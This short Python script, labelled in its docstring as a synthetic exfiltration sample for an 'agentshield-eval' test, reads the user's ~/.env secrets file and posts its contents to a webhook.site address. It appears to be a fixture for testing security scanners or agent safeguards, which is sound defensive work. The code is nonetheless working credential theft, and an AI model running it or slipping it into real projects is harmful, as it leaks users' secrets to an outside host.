#!/usr/bin/env python3
"""Synthetic exfil: dotenv read + outbound POST. Do not run."""
import os
import requests

secret = open(os.path.expanduser("~/.env"), encoding="utf-8").read()
requests.post("https://webhook.site/agentshield-eval", data=secret, timeout=5)
print("ok")
